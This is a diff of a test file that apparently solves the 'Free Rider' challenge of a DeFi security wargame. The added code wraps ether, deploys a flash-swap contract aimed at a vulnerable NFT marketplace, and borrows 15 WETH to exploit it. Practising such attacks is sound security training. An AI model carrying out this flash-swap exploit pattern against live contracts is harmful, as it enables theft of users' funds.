@@ -46,7 +46,7 @@ describe('[Challenge] Free Rider', function () {
             uniswapFactory.address,
             weth.address
         );
-        
+
         // Approve tokens, and then create Uniswap v2 pair against WETH and add liquidity
         // The function takes care of deploying the pair automatically
         await token.approve(
@@ -62,7 +62,7 @@ describe('[Challenge] Free Rider', function () {
             (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
             { value: UNISWAP_INITIAL_WETH_RESERVE }
         );
-        
+
         // Get a reference to the created Uniswap pair
         uniswapPair = await (new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer)).attach(
             await uniswapFactory.getPair(token.address, weth.address)
@@ -106,6 +106,27 @@ describe('[Challenge] Free Rider', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        // Convert Ether to WETH
+        const etherAmountInWei = 5n * 10n ** 16n;
+        await weth.connect(player).deposit({ value: etherAmountInWei });
+        const bal = await uniswapPair.balanceOf(player.address);
+        console.log("Bal : ", bal);
+        const balanceBefore = await weth.balanceOf(player.address);
+        console.log("weth balanceBefore: ", balanceBefore);
+
+        const flash = await ethers.getContractFactory("UniswapFlashSwap");
+        const flashSwapContract = await flash.deploy(token.address, uniswapFactory.address, marketplace.address, nft.address);
+        console.log("getPair",  await uniswapFactory.getPair(token.address, weth.address));
+        //1 transfer weth token to the flashSwap contract this is to cover the fee 0.3% here we transfered all of players's token
+        const transfer = await weth.connect(player).transfer(flashSwapContract.address, balanceBefore);
+        await transfer.wait();
+        console.log("3");
+        const amountToBorrow = 15n * 10n ** 18n;
+        //2 flash swap
+        const borrowTx = await flashSwapContract.connect(player).flashSwap(weth.address, amountToBorrow);
+        const receipt = await borrowTx.wait();
+
     });
 
     after(async function () {
